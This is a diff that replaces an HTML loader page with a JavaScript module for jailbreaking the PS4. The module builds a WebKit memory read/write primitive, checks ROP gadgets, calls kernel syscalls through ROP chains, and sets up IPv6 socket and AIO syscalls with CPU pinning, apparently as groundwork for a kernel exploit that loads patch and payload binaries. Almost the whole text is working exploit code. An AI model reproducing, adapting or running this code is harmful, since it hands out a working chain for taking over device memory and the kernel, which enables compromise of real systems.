@@ -1,154 +1,3367 @@
-<!doctype html>
-<html lang="en" manifest="cache.appcache">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>RAW GAME</title>
-    <style>
-      html,
-      body {
-        margin: 0;
-        padding: 0;
-        min-height: 100%;
-        background: #0b0d10;
-        color: #c8ced8;
-        font:
-          15px/1.45 "Segoe UI",
-          system-ui,
-          sans-serif;
-      }
-      #brand {
-        text-align: center;
-        padding: 8px 10px;
-        background: #0e1116;
-        border-bottom: 1px solid #1e2732;
-      }
-      #brand img {
-        width: 28px;
-        height: 28px;
-        margin-right: 8px;
-        border-radius: 50%;
-        vertical-align: middle;
-      }
-      #brand b {
-        font-size: 15px;
-        font-weight: 700;
-        letter-spacing: 0.14em;
-        color: #e6ebf2;
-        vertical-align: middle;
-      }
+import { establishPrimitive } from "./core.js?v=10";
+import { installWindowP, pairStatus } from "./mem.js";
+import { int64 } from "./int64.js";
+import { offsetsFor } from "./ps4_offsets.js";
 
-      /* running: a spinner under the brand. jb.js sets body.done / body.fail / body.log. */
-      #spin {
-        position: fixed;
-        top: calc(50% + 20px);
-        left: 50%;
-        width: 46px;
-        height: 46px;
-        margin: -23px 0 0 -23px;
-        border: 4px solid #1e2732;
-        border-top-color: #7fd0a0;
-        border-radius: 50%;
-        animation: spin 0.9s linear infinite;
+const outEl = document.getElementById("out");
+const stateEl = document.getElementById("state");
+const lines = [];
+let passCount = 0,
+  failCount = 0;
+const params = new URLSearchParams(location.search);
+const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
+
+function post(tag, detail) {
+  try {
+    const x = new XMLHttpRequest();
+    x.open("POST", "/t", true);
+    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    x.send(
+      "PS4-JB&tag=" +
+        encodeURIComponent(tag) +
+        "&detail=" +
+        encodeURIComponent(String(detail == null ? "" : detail)),
+    );
+  } catch (e) {}
+}
+
+const VERBOSE = params.get("verbose") === "1";
+const PROSE = [
+  / -- /,
+  /\.\s/,
+  /;\s/,
+  /,\s+(which|so|and that|because|since|as that)\s/,
+  /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
+  /\s+so\s+[a-z]/,
+  /\s+\([a-z][^)]{40,}\)/,
+];
+function terse(s) {
+  if (VERBOSE || s == null) return s;
+  s = String(s);
+  for (const re of PROSE) {
+    const m = re.exec(s);
+    if (m && m.index > 0) s = s.slice(0, m.index);
+  }
+  s = s.replace(/\s+$/, "");
+  if (s.length > 140) s = s.slice(0, 140) + "...";
+  return s;
+}
+
+const SHOW_LOG = params.get("log") === "1";
+if (SHOW_LOG && document.body) document.body.className = "log";
+function finishUI(ok) {
+  if (SHOW_LOG || !document.body) return;
+  document.body.className = ok ? "done" : "fail";
+}
+function mark(tag, detail) {
+  const raw = detail;
+  detail = terse(detail);
+  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
+  if (SHOW_LOG && outEl) {
+    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
+    outEl.innerHTML = lines
+      .map(function (l) {
+        l = esc(l);
+        const c =
+          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(
+            l,
+          )
+            ? "bad"
+            : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l)
+              ? "warn"
+              : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l)
+                ? "ok"
+                : "";
+        return c ? '<span class="' + c + '">' + l + "</span>" : l;
+      })
+      .join("\n");
+    outEl.scrollTop = outEl.scrollHeight;
+  }
+  post(tag, raw);
+}
+
+function trace(tag, detail) {
+  if (VERBOSE) mark(tag, detail);
+  else post(tag, detail);
+}
+function state(t, c) {
+  if (!SHOW_LOG || !stateEl) return;
+  stateEl.textContent = t;
+  stateEl.className = c || "";
+}
+function check(name, ok, detail) {
+  if (ok) {
+    passCount++;
+    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
+  } else {
+    failCount++;
+    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
+  }
+  return ok;
+}
+
+const SYS = {
+  getpid: 20,
+  getuid: 0x18,
+  close: 6,
+  socket: 97,
+  socketpair: 0x87,
+  getsockopt: 118,
+  setsockopt: 0x69,
+  mmap: 477,
+  munmap: 73,
+  thr_self: 432,
+  getgroups: 79,
+  getgid: 47,
+  cpuset_getaffinity: 487,
+  cpuset_setaffinity: 488,
+  aio_multi_poll: 664,
+  aio_multi_delete: 662,
+  getegid: 43,
+  aio_multi_wait: 663,
+  aio_multi_cancel: 666,
+  aio_submit_cmd: 669,
+  sysctl: 202,
+  kill: 37,
+  getppid: 39,
+};
+const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
+const keepAlive = [];
+let mainMf = null,
+  mainOrig = null,
+  mainArmed = false;
+let pinRestore = null;
+
+let jbRestoreHook = null;
+let allDone = false,
+  jailbroken = false,
+  kpatched = false,
+  payloadRunning = false;
+
+(async function () {
+  let p = null;
+
+  const opened = [];
+  let closeFd = null;
+  try {
+    const { key, off } = offsetsFor(navigator.userAgent);
+    mark("FW", key || "(not a PS4 UA)");
+    if (!off) {
+      state("no offsets for this firmware", "bad");
+      return;
+    }
+    const fwKey = key || "unknown";
+
+    const DO_JB = params.get("jb") !== "0";
+    const DO_PATCH = params.get("patch") !== "0";
+    const DO_PAYLOAD = params.get("payload") !== "0";
+
+    const KEEP_JB = params.get("keepjb") === "1";
+
+    const NEED_K = [
+      "k_idt_rsvd",
+      "k_oid_kern_file",
+      "k_oid_maxfilesperproc",
+      "k_oid_maxprocperuid",
+      "k_oid_maxfiles",
+      "k_arg1_maxfilesperproc",
+      "k_arg1_maxprocperuid",
+      "k_arg1_maxfiles",
+      "k_prison0",
+      "k_rootvnode",
+    ];
+    const missing = NEED_K.filter((k) => off[k] === undefined);
+    if (
+      !check(
+        "kernel-table-present",
+        missing.length === 0,
+        "fw=" +
+          fwKey +
+          " missing=[" +
+          missing.join(",") +
+          "]" +
+          " -- dump this firmware with kdump5.html and derive its table" +
+          " with tools/kderive.py; stage=pre_primitive",
+      )
+    )
+      return;
+
+    const KPATCH_FILE =
+      "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
+    const PAYLOAD_FILE = off.payload || "payload.bin";
+    const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
+      (k) => off[k] === undefined,
+    );
+    if (
+      !check(
+        "kpatch-table-present",
+        !DO_PATCH || needPatch.length === 0,
+        "missing=[" +
+          needPatch.join(",") +
+          "] blob=" +
+          KPATCH_FILE +
+          " -- build it from patches/<fw>.c, see patches/1300.c",
+      )
+    )
+      return;
+    const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter(
+      (k) => off[k] === undefined,
+    );
+    if (
+      !check(
+        "payload-table-present",
+        !DO_PAYLOAD || needPl.length === 0,
+        "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
+      )
+    )
+      return;
+    mark("FW-STATUS", off.fw_status || "none");
+    mark(
+      "FW-KTABLE",
+      "idt_rsvd=0x" +
+        off.k_idt_rsvd.toString(16) +
+        " prison0=0x" +
+        off.k_prison0.toString(16) +
+        " rootvnode=0x" +
+        off.k_rootvnode.toString(16) +
+        " kpatch=" +
+        KPATCH_FILE +
+        " payload=" +
+        PAYLOAD_FILE +
+        " src=ps4_offsets.js",
+    );
+
+    // ---- benign-miss auto-retry (reads only, before any kernel write) ----
+    // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
+    // phase -- no kernel .data/.text has been touched yet, so reloading and
+    // retrying is safe. The counter lives in sessionStorage so it survives
+    // the reload and is cleared the moment the read phase succeeds, so a
+    // later manual run always starts fresh. NEVER call retryBenign() after a
+    // kernel write: a reload would re-enter with the kernel already modified.
+    // A hard KP (a total reclaim miss that faults inside the cancel walk)
+    // cannot be caught here and still needs a reboot -- this only recovers
+    // the benign, detectable misses.
+    const RETRY_MAX = params.get("retry")
+      ? parseInt(params.get("retry"), 10)
+      : 8;
+    const RETRY_KEY = "jb1352-read-retry";
+    const retryCount = () => {
+      try {
+        return parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10) || 0;
+      } catch (e) {
+        return 0;
       }
-      @keyframes spin {
-        to {
-          transform: rotate(360deg);
+    };
+    const clearRetry = () => {
+      try {
+        sessionStorage.removeItem(RETRY_KEY);
+      } catch (e) {}
+    };
+    const retryBenign = (why) => {
+      const n = retryCount();
+      if (n >= RETRY_MAX) {
+        mark(
+          "AUTO-RETRY-GIVEUP",
+          "why=" + why + " after " + n + " reloads -- reboot and try again",
+        );
+        return false;
+      }
+      try {
+        sessionStorage.setItem(RETRY_KEY, String(n + 1));
+      } catch (e) {}
+      mark(
+        "AUTO-RETRY",
+        "why=" +
+          why +
+          " reload " +
+          (n + 1) +
+          "/" +
+          RETRY_MAX +
+          " (benign read miss, no kernel write yet)",
+      );
+      setTimeout(() => {
+        try {
+          location.reload();
+        } catch (e) {}
+      }, 400);
+      return true;
+    };
+    if (retryCount() > 0)
+      mark(
+        "AUTO-RETRY-RESUME",
+        "read-phase retry " + retryCount() + "/" + RETRY_MAX,
+      );
+
+    state("running the primitive...", "warn");
+    await new Promise((r) => setTimeout(r, 0));
+
+    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
+    const carrier = await establishPrimitive({
+      maxAttempts: 6,
+      onEvent: (t, d, a) =>
+        (PRIMITIVE_LOUD.test(t) ? mark : trace)(
+          t,
+          (a != null ? "[" + a + "] " : "") + (d || ""),
+        ),
+    });
+    installWindowP(carrier, { promote: false });
+    if (!window.p) throw new Error("window.p was not installed");
+    p = window.p;
+    mark(
+      "PAIR-STATUS",
+      "state=" +
+        pairStatus.state +
+        " promoted=" +
+        pairStatus.promoted +
+        "   (promotion off: the 137 MB stays pinned)",
+    );
+    mark("PRIMITIVE-OK", "");
+
+    const cell = p.leakval(Math.expm1);
+    const nativeFn = p.read8(
+      p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function),
+    );
+    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
+    const libkernelBase = errorFn.sub32(off.k__error);
+    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
+    const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
+    if (
+      !check(
+        "module-bases-0x4000-aligned",
+        aligned(webkitBase) && aligned(libkernelBase),
+        "",
+      )
+    )
+      return;
+
+    const G = {};
+    const GAD = [
+      ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
+      ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
+      ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
+      ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
+      ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
+      ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
+      ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
+      ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
+      [
+        "MOV_RDI_RAX_RET",
+        off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
+        [0x48, 0x89, 0x07, 0xc3],
+      ],
+      ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
+      ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
+      ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
+      ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
+      [
+        "G4",
+        off.wk_MOV_RDX_RAX_18_CALL_10,
+        [0x48, 0x8b, 0x50, off.pivot_view_sp],
+      ],
+      ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
+    ];
+    let gated = 0;
+    for (const [nm, rva, pat] of GAD) {
+      const a = webkitBase.add32(rva);
+      let good = true;
+      for (let i = 0; i < pat.length; ++i) {
+        if (pat[i] === null) continue;
+        if (p.read1(a.add32(i)) !== pat[i]) {
+          good = false;
+          break;
         }
       }
-      #msg {
-        position: fixed;
-        top: 50%;
-        left: 0;
-        right: 0;
-        transform: translateY(-50%);
-        text-align: center;
-        font-size: 16px;
-        letter-spacing: 0.5px;
-        display: none;
+      if (good) {
+        G[nm] = a;
+        gated++;
+      } else mark("GADGET-BAD", nm);
+    }
+    if (
+      !check(
+        "gadget-table-fits-module",
+        gated === GAD.length,
+        gated + "/" + GAD.length,
+      )
+    )
+      return;
+    const argGadget = [
+      G.POP_RDI_RET,
+      G.POP_RSI_RET,
+      G.POP_RDX_RET,
+      G.POP_RCX_RET,
+      G.POP_R8_RET,
+      G.POP_R9_RET,
+    ];
+
+    const stubAddr = new Map();
+    let seeded = 0;
+    if (off.k_stubs) {
+      for (const numStr in off.k_stubs) {
+        const num = +numStr,
+          o = off.k_stubs[numStr];
+        const v = p.read8(libkernelBase.add32(o));
+        if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
+        if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 !== num)
+          continue;
+        stubAddr.set(num, libkernelBase.add32(o));
+        seeded++;
       }
-      #wrap {
-        padding: 0;
+    }
+    const need = new Set(
+      Object.keys(SYS)
+        .map((k) => SYS[k])
+        .filter((n) => !stubAddr.has(n)),
+    );
+    let scanned = 0;
+    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
+      const v = p.read8(libkernelBase.add32(o));
+      if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
+      const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
+      if (!need.has(num)) continue;
+      stubAddr.set(num, libkernelBase.add32(o));
+      need.delete(num);
+      scanned++;
+    }
+    mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
+    const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
+    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
+      return;
+
+    function bufAddr(ab) {
+      const c = p.leakval(ab);
+      return p.read8(
+        p
+          .read8(c.add32(off.wk_ArrayBuffer_m_impl))
+          .add32(off.wk_ArrayBuffer_m_contents_m_data),
+      );
+    }
+    function put(dv, at, v) {
+      if (typeof v === "number") {
+        dv.setUint32(at, v >>> 0, true);
+        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
+      } else {
+        dv.setUint32(at, v.low >>> 0, true);
+        dv.setUint32(at + 4, v.hi >>> 0, true);
       }
-      #state,
-      #out {
-        display: none;
+    }
+    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
+    function makeCtx() {
+      const sb = new ArrayBuffer(0x20),
+        pb = new ArrayBuffer(PB_SIZE);
+      const kb = new ArrayBuffer(0x2000),
+        fb = new ArrayBuffer(0x40);
+      keepAlive.push(sb, pb, kb, fb);
+      const c = {
+        storeDv: new DataView(sb),
+        pivotDv: new DataView(pb),
+        stackDv: new DataView(kb),
+        frameDv: new DataView(fb),
+        stackU8: new Uint8Array(kb),
+        frameU8: new Uint8Array(fb),
+      };
+      keepAlive.push(
+        c.storeDv,
+        c.pivotDv,
+        c.stackDv,
+        c.frameDv,
+        c.stackU8,
+        c.frameU8,
+      );
+      c.S = bufAddr(sb);
+      c.P = bufAddr(pb);
+      c.K = bufAddr(kb);
+      c.F = bufAddr(fb);
+      put(c.storeDv, 0x00, G.G1);
+      put(c.storeDv, 0x08, c.P);
+      put(c.storeDv, 0x10, G.G3);
+      put(c.storeDv, 0x18, G.G2);
+      put(c.pivotDv, 0x00, c.P);
+      put(c.pivotDv, 0x10, G.G5);
+      put(c.pivotDv, 0x20, G.G4);
+      return c;
+    }
+    function layout(c, target, args) {
+      c.stackU8.fill(0);
+      c.frameU8.fill(0);
+      const insts = [];
+      for (let i = 0; i < args.length; ++i) {
+        insts.push(argGadget[i]);
+        insts.push(args[i]);
+      }
+      const targetIdx = insts.length;
+      insts.push(target);
+      insts.push(G.POP_RDI_RET);
+      insts.push(c.F);
+      insts.push(G.MOV_RDI_RAX_RET);
+      insts.push(G.POP_RAX_RET);
+      insts.push(JSVALUE_UNDEFINED);
+      insts.push(G.LEAVE_RET);
+      let at = 0x2000 - 8 * insts.length;
+      if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
+      for (let i = 0; i < insts.length; ++i)
+        put(c.stackDv, at + 8 * i, insts[i]);
+      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
+    }
+    const M = makeCtx();
+    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
+    mainOrig = p.read8(mainMf);
+    const pivotObj = {};
+    keepAlive.push(pivotObj);
+    const pivotCell = p.leakval(pivotObj);
+    p.write8(mainMf, G.G0);
+    mainArmed = true;
+    function callAddr(target, args) {
+      layout(M, target, args);
+      const saved = p.read8(pivotCell);
+      p.write8(pivotCell, M.S);
+      Math.expm1(pivotObj);
+      p.write8(pivotCell, saved);
+      return {
+        lo: M.frameDv.getUint32(0, true),
+        hi: M.frameDv.getUint32(4, true),
+        i32: M.frameDv.getUint32(0, true) | 0,
+      };
+    }
+    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
+    closeFd = (fd) => sc(SYS.close, fd).i32;
+    function errno() {
+      const r = callAddr(errorFn, []);
+      const a = new int64(r.lo, r.hi);
+      return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
+    }
+    const pid = sc(SYS.getpid).i32;
+    check(
+      "chain-reaches-kernel",
+      pid > 0,
+      "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
+    );
+
+    const scratchAb = new ArrayBuffer(0x1000);
+    keepAlive.push(scratchAb);
+    const scratch = bufAddr(scratchAb);
+    const argAb = new ArrayBuffer(8);
+    keepAlive.push(argAb);
+    const argAddr = bufAddr(argAb),
+      argDv = new DataView(argAb);
+    const lenAb = new ArrayBuffer(8);
+    keepAlive.push(lenAb);
+    const lenAddr = bufAddr(lenAb),
+      lenDv = new DataView(lenAb);
+
+    function makeRpc(wk, name) {
+      let seq = 0;
+      const pending = new Map();
+      wk.onmessage = function (e) {
+        const d = e.data || {};
+        const slot = pending.get(d.id);
+        if (!slot) return;
+        pending.delete(d.id);
+        if (slot.timer) clearTimeout(slot.timer);
+        if (d.type === "err") slot.reject(new Error(String(d.value)));
+        else slot.resolve(d.value);
+      };
+      wk.onerror = (e) =>
+        mark(
+          "WORKER-ONERROR",
+          name + " " + (e && e.message ? e.message : String(e)),
+        );
+      return function call(fname, timeoutMs, ...args) {
+        return new Promise(function (resolve, reject) {
+          const id = seq++;
+          const timer =
+            timeoutMs > 0
+              ? setTimeout(function () {
+                  pending.delete(id);
+                  reject(new Error(name + ": timeout waiting for " + fname));
+                }, timeoutMs)
+              : null;
+          pending.set(id, { resolve, reject, timer });
+          wk.postMessage({ id: id, name: fname, args: args });
+        });
+      };
+    }
+    function ptrish(v) {
+      return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0;
+    }
+
+    const IPPROTO_IPV6 = 41,
+      IPV6_RTHDR = 51;
+    const AF_INET6 = 28,
+      SOCK_DGRAM = 2,
+      AF_UNIX = 1,
+      SOCK_STREAM = 1;
+    const RTH_SIZE = 0x48,
+      RTH_LEN = 8,
+      RTH_SEGLEFT = 4;
+    const NODE0_DEC = 0x04000800,
+      SCRATCH_PAGE = 0x04000000;
+    const SYS_MMAP = 477;
+    const PROT_RW = 3,
+      MAP_PRIVATE = 2,
+      MAP_FIXED = 0x10,
+      MAP_ANON = 0x1000;
+    const NODE_SZ = 0x38;
+    const N_LEAK = params.get("n") ? parseInt(params.get("n"), 10) : 262144;
+    const SPRAY = params.get("spray") ? parseInt(params.get("spray"), 10) : 512;
+    const SPIN = params.get("spin")
+      ? parseInt(params.get("spin"), 10)
+      : 40000000;
+    mark("PR-CFG", "nleak=" + N_LEAK + " spray=" + SPRAY + " spin=" + SPIN);
+
+    async function bringWorker(name) {
+      const w = { name: name, armed: false, wired: false };
+      w.worker = new Worker("rpc_worker.js");
+      w.rpc = makeRpc(w.worker, name);
+      if ((await w.rpc("ping", 15000)) !== "pong")
+        throw new Error(name + " ping");
+      const sLo = 0x10100000,
+        sHi = 0xc0de0000;
+      const arr = await w.rpc("init", 15000, sLo, sHi);
+      keepAlive.push(arr);
+      const D = bufAddr(arr.buffer);
+      if (p.read4(D) >>> 0 !== sLo) throw new Error(name + " transfer");
+      const storage = p.read8(D.add32(0x10));
+      const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
+      if (!mc || !ptrish(mc)) throw new Error(name + " walk");
+      const bf = p.read8(mc.add32(8));
+      let wm = null,
+        wv = null,
+        wl = null;
+      for (let k = 1; k <= 8; ++k) {
+        const val = p.read8(bf.sub32(8 * k));
+        if (!ptrish(val)) continue;
+        const inl = p.read8(val.add32(0x10));
+        const len = p.read4(val.add32(0x18)) >>> 0;
+        if (inl.hi === 0 && inl.low === 2) {
+          if (!wl) wl = val;
+        } else if (inl.hi > 0 && len === 6) {
+          if (!wm) wm = val;
+        } else if (inl.hi > 0 && len === 0x30) {
+          if (!wv) wv = val;
+        }
+      }
+      if (!(wm && wv && wl)) throw new Error(name + " shapes");
+      w.master = wm;
+      w.origVector = p.read8(wm.add32(0x10));
+      p.write8(wm.add32(0x10), wv);
+      w.wired = true;
+      await w.rpc("setup", 15000, wl.low, wl.hi);
+      await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
+      w.armed = true;
+      w.ctx = makeCtx();
+      w.fire = function (num, args, ms) {
+        layout(w.ctx, stubAddr.get(num), args);
+        return w.rpc(
+          "fire",
+          ms === undefined ? 20000 : ms,
+          w.ctx.S.low,
+          w.ctx.S.hi,
+        );
+      };
+      return w;
+    }
+    const w1 = await bringWorker("w1");
+    const w2 = await bringWorker("w2");
+    await w1.fire(SYS.getpid, []);
+    const w1pid = w1.ctx.frameDv.getUint32(0, true) | 0;
+    await w2.fire(SYS.getpid, []);
+    const w2pid = w2.ctx.frameDv.getUint32(0, true) | 0;
+    check(
+      "pr-two-workers-reach-kernel",
+      w1pid > 0 && w2pid > 0,
+      "w1 getpid=" +
+        w1pid +
+        " w2 getpid=" +
+        w2pid +
+        " main=" +
+        sc(SYS.getpid).i32,
+    );
+
+    const mr = sc(
+      SYS_MMAP,
+      SCRATCH_PAGE,
+      0x10000,
+      PROT_RW,
+      MAP_FIXED | MAP_ANON | MAP_PRIVATE,
+      -1,
+      0,
+    );
+    const mgot = new int64(mr.lo, mr.hi);
+    if (
+      !check(
+        "pr-scratch-page-mapped",
+        mgot.hi >>> 0 === 0 && mgot.low >>> 0 === SCRATCH_PAGE,
+        "got=0x" + (mgot.low >>> 0).toString(16),
+      )
+    )
+      return;
+    const vs = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
+    if (vs < 0) {
+      mark("PR-ABORT", "verify socket");
+      return;
+    }
+    opened.push(vs);
+    {
+      const tAb = new ArrayBuffer(RTH_SIZE);
+      keepAlive.push(tAb);
+      const tDv = new DataView(tAb);
+      tDv.setUint8(1, RTH_LEN);
+      tDv.setUint8(3, RTH_SEGLEFT);
+      sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb), RTH_SIZE);
+      const RT = SCRATCH_PAGE + 0x2000;
+      lenDv.setUint32(0, RTH_SIZE, true);
+      lenDv.setUint32(4, 0, true);
+      const g1 = sc(
+        SYS.getsockopt,
+        vs,
+        IPPROTO_IPV6,
+        IPV6_RTHDR,
+        RT,
+        lenAddr,
+      ).i32;
+      const s2 = sc(
+        SYS.setsockopt,
+        vs,
+        IPPROTO_IPV6,
+        IPV6_RTHDR,
+        RT,
+        lenDv.getUint32(0, true),
+      ).i32;
+      if (
+        !check(
+          "pr-scratch-page-kernel-rw",
+          g1 === 0 && s2 === 0,
+          "copyout=" + g1 + " copyin=" + s2,
+        )
+      )
+        return;
+    }
+
+    const mAb = new ArrayBuffer(0x40);
+    keepAlive.push(mAb);
+    const mU32 = new Uint32Array(mAb);
+    keepAlive.push(mU32);
+    const mU8 = new Uint8Array(mAb);
+    keepAlive.push(mU8);
+    const M_AD = bufAddr(mAb);
+    mU32.fill(0);
+    mU32[6] = 4;
+    const OWNER_LO = 6,
+      OWNER_HI = 7;
+    const lkAb = new ArrayBuffer(0x40);
+    keepAlive.push(lkAb);
+    const lkDv = new DataView(lkAb),
+      lkAd = bufAddr(lkAb);
+    const LX = lkAd.add32(0x00),
+      LC = lkAd.add32(0x10);
+
+    const NBLOCK = 8;
+    const bspAb = new ArrayBuffer(8);
+    keepAlive.push(bspAb);
+    const bspDv = new DataView(bspAb);
+    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(bspAb)).i32 !== 0) {
+      mark("PR-ABORT", "block socketpair");
+      return;
+    }
+    const bsp0 = bspDv.getInt32(0, true),
+      bsp1 = bspDv.getInt32(4, true);
+    opened.push(bsp0, bsp1);
+    const brbAb = new ArrayBuffer(0x40);
+    keepAlive.push(brbAb);
+    const brqAb = new ArrayBuffer(NBLOCK * 0x28);
+    keepAlive.push(brqAb);
+    const brqDv = new DataView(brqAb);
+    for (let k = 0; k < NBLOCK; k++) {
+      const b = k * 0x28;
+      put(brqDv, b + 0x08, 0x40);
+      put(brqDv, b + 0x10, bufAddr(brbAb));
+      brqDv.setInt32(b + 0x20, bsp0, true);
+    }
+    const bidAb = new ArrayBuffer(NBLOCK * 4);
+    keepAlive.push(bidAb);
+
+    const CPU_LEVEL_WHICH = 3,
+      CPU_WHICH_TID = 1,
+      CPUSET_SZ = 0x10;
+    const ID64 = new int64(0xffffffff, 0xffffffff);
+    const mskAb = new ArrayBuffer(CPUSET_SZ);
+    keepAlive.push(mskAb);
+    const mskDv = new DataView(mskAb),
+      mskAd = bufAddr(mskAb);
+    new Uint8Array(mskAb).fill(0);
+    const affGot = sc(
+      SYS.cpuset_getaffinity,
+      CPU_LEVEL_WHICH,
+      CPU_WHICH_TID,
+      ID64,
+      CPUSET_SZ,
+      mskAd,
+    ).i32;
+    const savedMask = mskDv.getUint32(0, true) >>> 0;
+    const cores = [];
+    for (let i = 0; i < 32; i++) if (savedMask & (1 << i)) cores.push(i);
+    mark(
+      "PIN-AVAIL",
+      "rv=" +
+        affGot +
+        " mask=0x" +
+        savedMask.toString(16) +
+        " cores=" +
+        cores.join(","),
+    );
+    if (
+      !check(
+        "pin-read-mask",
+        affGot === 0 && cores.length > 0,
+        "rv=" + affGot + " cores=" + cores.length,
+      )
+    )
+      return;
+    const PINCORE = params.get("core")
+      ? parseInt(params.get("core"), 10)
+      : cores[0];
+    new Uint8Array(mskAb).fill(0);
+    mskDv.setUint32(0, (1 << PINCORE) >>> 0, true);
+    const affSet = sc(
+      SYS.cpuset_setaffinity,
+      CPU_LEVEL_WHICH,
+      CPU_WHICH_TID,
+      ID64,
+      CPUSET_SZ,
+      mskAd,
+    ).i32;
+    new Uint8Array(mskAb).fill(0);
+    sc(
+      SYS.cpuset_getaffinity,
+      CPU_LEVEL_WHICH,
+      CPU_WHICH_TID,
+      ID64,
+      CPUSET_SZ,
+      mskAd,
+    );
+    const backMask = mskDv.getUint32(0, true) >>> 0;
+    mark(
+      "PIN-SET",
+      "core=" +
+        PINCORE +
+        " rv=" +
+        affSet +
+        " reads back 0x" +
+        backMask.toString(16),
+    );
+    if (
+      !check(
+        "MAIN-PINNED",
+        affSet === 0 && backMask === (1 << PINCORE) >>> 0,
+        "core=" +
+          PINCORE +
+          " mask=0x" +
+          backMask.toString(16) +
+          " (free and malloc in armOnce now share one UMA per-cpu bucket)",
+      )
+    )
+      return;
+
+    const OTHER =
+      cores.length > 1
+        ? cores[0] === PINCORE
+          ? cores[cores.length - 1]
+          : cores[0]
+        : PINCORE;
+    const msk2Ab = new ArrayBuffer(CPUSET_SZ);
+    keepAlive.push(msk2Ab);
+    const msk2Dv = new DataView(msk2Ab),
+      msk2Ad = bufAddr(msk2Ab);
+    new Uint8Array(msk2Ab).fill(0);
+    msk2Dv.setUint32(0, (1 << OTHER) >>> 0, true);
+    let wpin = "skipped";
+    if (OTHER !== PINCORE) {
+      const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
+      await w1.fire(SYS.cpuset_setaffinity, aw);
+      const r1 = w1.ctx.frameDv.getUint32(0, true) | 0;
+      await w2.fire(SYS.cpuset_setaffinity, aw);
+      const r2 = w2.ctx.frameDv.getUint32(0, true) | 0;
+      wpin = "w1=" + r1 + " w2=" + r2;
+      check(
+        "WORKERS-PINNED",
+        r1 === 0 && r2 === 0,
+        "workers on core " + OTHER + ", main on " + PINCORE + " -- " + wpin,
+      );
+    } else {
+      mark("PIN-ONE-CORE", "only one core available, workers share it");
+    }
+    mark("PIN-SPLIT", "main=" + PINCORE + " workers=" + OTHER + " " + wpin);
+
+    pinRestore = function () {
+      new Uint8Array(mskAb).fill(0);
+      mskDv.setUint32(0, savedMask, true);
+      const r = sc(
+        SYS.cpuset_setaffinity,
+        CPU_LEVEL_WHICH,
+        CPU_WHICH_TID,
+        ID64,
+        CPUSET_SZ,
+        mskAd,
+      ).i32;
+      mark("PIN-RESTORED", "rv=" + r + " mask=0x" + savedMask.toString(16));
+    };
+
+    mark(
